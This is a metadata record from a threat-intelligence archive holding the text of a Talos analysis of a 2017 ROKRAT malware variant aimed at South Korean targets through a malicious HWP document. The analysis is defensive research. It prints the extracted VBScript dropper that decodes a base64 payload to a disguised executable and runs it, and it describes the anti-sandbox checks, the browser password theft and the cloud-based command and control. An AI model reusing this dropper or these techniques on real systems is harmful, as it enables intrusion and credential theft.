{
    "id": "f07905a9-6a13-4ae1-8a43-ca2edc3ac620",
    "created_at": "2023-01-12T15:07:16.664933Z",
    "updated_at": "2025-03-27T02:13:34.599292Z",
    "deleted_at": null,
    "sha1_hash": "e985be19973c68104f974909855e279ebfe9baca",
    "title": "2017-11-28 - ROKRAT Reloaded",
    "authors": "",
    "file_creation_date": "2022-05-28T15:55:09Z",
    "file_modification_date": "2022-05-28T15:55:09Z",
    "file_size": 1351085,
    "plain_text": "# ROKRAT Reloaded\n\n**[blog.talosintelligence.com/2017/11/ROKRAT-Reloaded.html](http://blog.talosintelligence.com/2017/11/ROKRAT-Reloaded.html)**\n\n[This post was authored by Warren Mercer,](https://www.twitter.com/SecurityBeard/) [Paul Rascagneres and with contributions from](https://www.twitter.com/r00tbsd)\nJungsoo An.\n\n## Executive Summary\n\n[Earlier this year, Talos published 2 articles concerning South Korean threats. The first one](http://blog.talosintelligence.com/2017/02/korean-maldoc.html)\nwas about the use of a malicious HWP document which dropped downloaders used to\nretrieve malicious payloads on several compromised websites. One of the website was a\ncompromised government website. We named this case \"Evil New Years\". The [second one](http://blog.talosintelligence.com/2017/04/introducing-rokrat.html)\nwas about the analysis and discovery of the ROKRAT malware.\n\nThis month, Talos discovered a new ROKRAT version. This version contains technical\nelements that link the two previous articles. This new sample contains code from the two\npublications earlier this year:\n\nIt contains the same reconnaissance code used;\nSimilar PDB pattern that the \"Evil New Years\" samples used;\nit contains the same cloud features and similar copy-paste methods that ROKRAT\nused;\n\n\n-----\n\nIt uses cloud platform as C&C but not exactly the same. This version uses pcloud, box,\ndropbox and yandex.\n\nWe also discovered that this new version of ROKRAT shares code with Freenki, a\ndownloader used in the FreeMilk campaign.\n\nThe campaign started, unsurprisingly, with a malicious HWP document. This document was\nalleged to be written by a lawyer who claims to represent the \"Citizens' Alliance for North\nKorean Human Rights and Reunification of Korean Peninsula\". It mentions a meeting of this\ngroup that took place the 1st of November at Seoul. Due to the content of this malicious\ndocument we can assume that the targets are interested by the situation in North Korea. This\nmalicious document drops and executes a new version of ROKRAT.\n\n## HWP Malicious Document\n\nAs with the previous ROKRAT campaigns we described the infection vector used with this\nactor is a malicious HWP document. The HWP files are created using Hangul Word\nProcessor, a popular alternative to Microsoft Office for South Korean users developed by\nHancom. Here is a screenshot of the malicious document:\n\n\n-----\n\nThe malicious document mentions the \"Community of North Korean human right and\nunification\". We first observed his campaign during November 2017. The document was\nalleged to be written by a lawyer who has been representing the community known as '올인\n통 (올바른북한인권법과통일을위한시민모임)'.\n\nThe purpose of the document is to arrange a meeting to discuss about items which are\nrelated to 'North Korean Human Rights Act' and 'Enactment of a law' which passed in last\n2016 in South Korea.\n\nBased on the meeting date (1st Nov 2017), this decoy document could be delivered to the\nstakeholders in the community '올인통' by pretending to be a request to join the discussion\nfor finding better ideas/ways to let more people be interested in their activity before Nov\n2017.\n\n\n-----\n\nThe HWP file contains an OLE object named BIN0001.OLE. Once extracted and\nuncompressed (zlib), we obtain the following script:\n```\nconst strEncode =\n\"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6AAAA\nDIM outFile\nDIM base64Decoded\nDIM shell_obj\nSET shell_obj = CreateObject(\"WScript.Shell\")\nDIM fso\nSET fso = CreateObject(\"Scripting.FileSystemObject\")\noutFile = \"c:\\ProgramData\\HncModuleUpdate.exe\"\nbase64Decoded = decodeBase64(strEncode)\nIF NOT(fso.FileExists(outFile)) then\nwriteBytes outFile, base64Decoded\nshell_obj.run outFile\nEND IF\nWScript.Quit()\nprivate function decodeBase64(base64)\nDIM DM, EL\nSET DM = CreateObject(\"Microsoft.XMLDOM\")\nSET EL = DM.createElement(\"tmp\")\nEL.DataType = \"bin.base64\"\nEL.Text = base64\ndecodeBase64 = EL.NodeTypedValue\nend function\nprivate Sub writeBytes(file, bytes)\nDIM binaryStream\nSET binaryStream = CreateObject(\"ADODB.Stream\")\nbinaryStream.Type = 1\nbinaryStream.Open\nbinaryStream.Write bytes\nbinaryStream.SaveToFile file, 1\nEnd Sub\n\n```\nThe purpose is to decode, using the base64 algorithm, the content of the strEncode variable.\nThe decoded data is stored in the c:\\ProgramData\\HncModuleUpdate.exe file and executed.\nThe binary is the ROKRAT dropper. The specific filename 'HncModuleUpdate' may fool a\nuser into thinking this is a Hancom software.\n\n## Stage 1: Dropper\n\nThe purpose of the dropper is to extract the resource named SBS. This resource contains\nmalicious shellcode. Additionally, the dropper executes a new cmd.exe process, injects the\nextracted resource and executes it. The code injection is performed by the VirtualAlloc(),\nWriteProcessMemory() and CreateRemoteThread() APIs:\n\n\n-----\n\nOnce executed, the shellcode will decoded a PE file, will load it in the memory of cmd.exe\nand finally will execute it. This payload is a new variant of ROKRAT.\n\nAdditionally, one of the analysed droppers displays a picture to the user:\n\n\n-----\n\nThe people in the pictures are about the Korean war and people related to independence\ntroops during the \"independence movement\". The image on the top left comes from\n[Wikipedia. The picture in the middle left comes from this blog. And the bottom left image](https://ko.wikipedia.org/wiki/%EB%B0%B1%EC%84%A0%EC%97%BD)\ncomes from this [news website. The decoy image seems to be a set of public pictures.](http://m.ohmynews.com/NWS_Web/Mobile/at_pg.aspx?CNTN_CD=A0000939170#cb)\n\n## Stage 2: ROKRAT\n\n### Similarities With the \"Evil New Years\" MalDoc\n\nThis variant of ROKRAT contains similar code with the \"Evil New Years\" downloader. The\ninformation collected during the reconnaissance phase is similar. The malware uses the\nfollowing registry key to get the machine type:\nHKLM\\System\\CurrentControlSet\\Services\\mssmbios\\Data\\SMBiosData. The \"System\nmanufacturer\" value is used to identify the type of machine. Here is the graph flow of the\n\"Evil New Years\" downloader:\n\n\n-----\n\nThe graph flow of the ROKRAT variant:\n\n\n-----\n\nThe graph flows are 99% similar. Additionally, the machine type is described with the\nfollowing strings:\n\n[The code appears to be based on this forum post describing the use of the Win32 APIs](http://www.rohitab.com/discuss/topic/35915-win32-api-to-get-system-information/?p%3D10075283)\nused. The source code only considers the following type:\n\n\n-----\n\n```\ndefault:  lpString (Other) ;        break;\ncase 0x02: lpString = \"(Unknown)\";       break;\ncase 0x03: lpString = \"(Desktop)\";       break;\ncase 0x04: lpString = \"(Low Profile Desktop)\"; break;\ncase 0x06: lpString = \"(Mini Tower)\";     break;\ncase 0x07: lpString = \"(Tower)\";        break;\ncase 0x08: lpString = \"(Portable)\";      break;\ncase 0x09: lpString = \"(Laptop)\";       break;\ncase 0x0A: lpString = \"(Notebook)\";      break;\ncase 0x0E: lpString = \"(Sub Notebook)\";    break;\n\n```\nNotice the () used by the ROKRAT author too. Some values are ignored as we can see from\nthe [SMBIOS documentation:](http://www.dmtf.org/sites/default/files/standards/documents/DSP0134_2.7.0.pdf)\n\nThe missing values are also omitted from the forum post.\n\n\n-----\n\nAnother similarity is the PDB path. The Evil New Year sample contained the following PDB\npath:\n```\n   e:\\Happy\\Work\\Source\\version 12\\T+M\\Result\\DocPrint.pdb\n\n```\nThis new ROKRAT variant contains the following PDB:\n```\n   d:\\HighSchool\\version 13\\2ndBD\\T+M\\T+M\\Result\\DocPrint.pdb\n\n```\nWe clearly have the similar pattern.\n\n### Anti-Sandbox\n\nThis ROKRAT variant contain anti-sandbox tricks. This is performed by checking if the\nfollowing libraries are loaded:\n\nSbieDll.dll (sandboxie library)\nDbghelp.dll (Microsoft debugging tools)\nApi_log.dll (threatAnalyzer / GFI SandBox)\nDir_watch.dll (threatAnalyzer / GFI SandBox)\n\n### Anti-Debug\n\nThis ROKRAT version contains anti-debug tricks. For example it uses the following NOP\ntechnique:\n\n\n-----\n\nnop dword ptr [eax+eax+00h] is a 5 bytes NOP: 0x0F1F440000. But this opcode is not\ncorrectly supported by Immunity Debugger, the assembly is replaced by \"???\" in red in the\nscreenshot:\n\n### Screenshots Feature\n\n\n-----\n\nThe two ROKRAT versions performed screenshots. It's interesting to note similarities\nbetween the two versions. Especially the filename of the saved screenshot, here is the April\nROKRAT version:\n\nAnd the code of the November version:\n\n\n-----\n\nThe pattern is exactly the same: %s%04X%04X.tmp. The two %04X are random values. And\nthe %s contains a temporary path (obtained with GetTempPath()). In both sample, the string\nlength is 0x12C (300). This part is clearly a copy-paste.\n\n### Browser Password Stealer\n\nOne of the analysed November ROKRAT samples contained a browser stealing capability.\nThe malware is able to extract the stored passwords from Internet Explorer, Chrome and\nFirefox. For Chrome and Firefox, the malware queries the sqlite database containing the\nURL, username and password:\n\n\n-----\n\nAdditionally, ROKRAT supports the Microsoft Vault mechanism. Vault was implemented in\nWindows 7, it contains any sensitive data (like the credentials) of Internet Explorer. Here is\nthe initialization of the Vault APIs:\n\n\n-----\n\n[The ROKRAT implementation is largely based on the following project. This is a change of](https://www.codeproject.com/Articles/1167943/The-Secrets-of-Internet-Explorer-Credentials)\ntactic for ROKRAT when compared with previous samples/versions. This time the actor is\nspecifically targeting information which would be used for additional compromises and\nmaybe even on potential personal accounts. The method used by the ROKRAT actors was\nalso out of the ordinary as they embedded the whole SQLite library into their executable to\nallow the SQLite browsing attempts used for Firefox & Google Chrome.\n\nDuring our investigation, we discovered that the browser password stealer code is exactly\n[the same as the code used during the FreeMilk campaign described by Unit 42. In this](https://researchcenter.paloaltonetworks.com/2017/10/unit42-freemilk-highly-targeted-spear-phishing-campaign/)\narticle, the author already noticed C2 infrastructure overlap between FreeMilk and ROKRAT.\nIn addition, we can add that some code overlap is present between the 2 samples:\n\n\n-----\n\nOn the left, we have the ROKRAT sample and on the right the FreeMilk sample. We can\nnotice that in addition to the code, the author copy-pasted English typos such as \"IE\nRegistery\".\n\n### Cloud Platforms Used As C&C\n\nFinally, this ROKRAT version uses cloud platforms in exactly the same way as our previous\nanalysis. This time, the author did not use social network platforms, but different cloud\nproviders:\n\n**pcloud**\n\n\n-----\n\n**Box**\n\n\n-----\n\n**Dropbox**\n\n**Yandex**\n\n\n-----\n\n## Conclusion\n\nThis campaign shows that the actor behind ROKRAT is still active. Based on the PDB, it\ncould be the 13th version of this malware. This actor made the decision only to use\nlegitimate cloud platforms, but changed some from the last incarnation. From an attacker's\nperspective it's an interesting choice, the flow is encrypted by default with HTTPS and the\nmalicious flow can be difficult to find in the middle of legitimate traffic to these platforms. We\ncan also determine that the actor likes to use code already available on the internet in\nvarious repositories we mentioned throughout this post ie; GitHub, Code Project and other\npublic forums.\n\nBased on source code copy-paste, we remain highly confident that the author of ROKRAT is\nalso behind, or working with those behind, the FreeMilk spear phishing campaign. This is\nfurther proven by the fact that ROKRAT shares code with Freenki downloader used in the\nFreeMilk campaign.\n\nMoreover, the actor is always interested by the same pattern of targets, the decoy\ndocuments refer to precise elements related to the geopolitical situation between North and\nSouth Korea. Generally, the documents reference the Ministry of Unification or the situation\nof North Korean citizens. They frequently contain specific references to real meetings or\nconferences, showing a high knowledge of current events in North and South Korea.\n\nTogether this information helps us to understand the profile of the targeted systems and the\ninterests of the threat actor.\n\n## Coverage\n\n\n-----\n\nAdditional ways our customers can detect and block this threat are listed below.\n\n[Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the](https://www.cisco.com/c/en/us/products/security/advanced-malware-protection)\nmalware used by these threat actors.\n\n[CWS or WSA web scanning prevents access to malicious websites and detects malware](https://www.cisco.com/c/en/us/products/security/cloud-web-security/index.html)\nused in these attacks.\n\n[Email Security can block malicious emails sent by threat actors as part of their campaign.](https://www.cisco.com/c/en/us/products/security/email-security-appliance/index.html)\n\n[Network Security appliances such asNGFW,NGIPS, andMeraki MX can detect malicious](https://www.cisco.com/c/en/us/products/security/firewalls/index.html)\nactivity associated with this threat.\n\n[AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security](https://www.cisco.com/c/en/us/solutions/enterprise-networks/amp-threat-grid/index.html)\nproducts.\n\n[Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious](https://umbrella.cisco.com/)\ndomains, IPs, and URLs, whether users are on or off the corporate network.\n\nOpen Source Snort Subscriber Rule Set customers can stay up to date by downloading the\n[latest rule pack available for purchase on Snort.org.](https://www.snort.org/products)\n\n## IOCs\n\nPath: c:\\ProgramData\\HncModuleUpdate.exe\n\nMalDoc: 171e26822421f7ed2e34cc092eaeba8a504b5d576c7fd54aa6975c2e2db0f824\n\nDropper #1: a29b07a6fe5d7ce3147dd7ef1d7d18df16e347f37282c43139d53cce25ae7037\n\nDropper #2: eb6d25e08b2b32a736b57f8df22db6d03dc82f16da554f4e8bb67120eacb1d14\n\nDropper #3: 9b383ebc1c592d5556fec9d513223d4f99a5061591671db560faf742dd68493f\n\nROKRAT: b3de3f9309b2f320738772353eb724a0782a1fc2c912483c036c303389307e2e\n\nFreenki: 99c1b4887d96cb94f32b280c1039b3a7e39ad996859ffa6dd011cf3cca4f1ba5\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-11-28 - ROKRAT Reloaded.pdf"
    ],
    "report_names": [
        "2017-11-28 - ROKRAT Reloaded.pdf"
    ],
    "threat_actors": [
        {
            "id": "08c8f238-1df5-4e75-b4d8-276ebead502d",
            "created_at": "2023-01-06T13:46:39.344081Z",
            "updated_at": "2025-03-27T02:00:03.056208Z",
            "deleted_at": null,
            "main_name": "Copy-Paste",
            "aliases": [],
            "source_name": "MISPGALAXY:Copy-Paste",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536036,
    "ts_updated_at": 1743041614,
    "ts_creation_date": 1653753309,
    "ts_modification_date": 1653753309,
    "files": {
        "pdf": "https://archive.orkl.eu/e985be19973c68104f974909855e279ebfe9baca.pdf",
        "text": "https://archive.orkl.eu/e985be19973c68104f974909855e279ebfe9baca.txt",
        "img": "https://archive.orkl.eu/e985be19973c68104f974909855e279ebfe9baca.jpg"
    }
}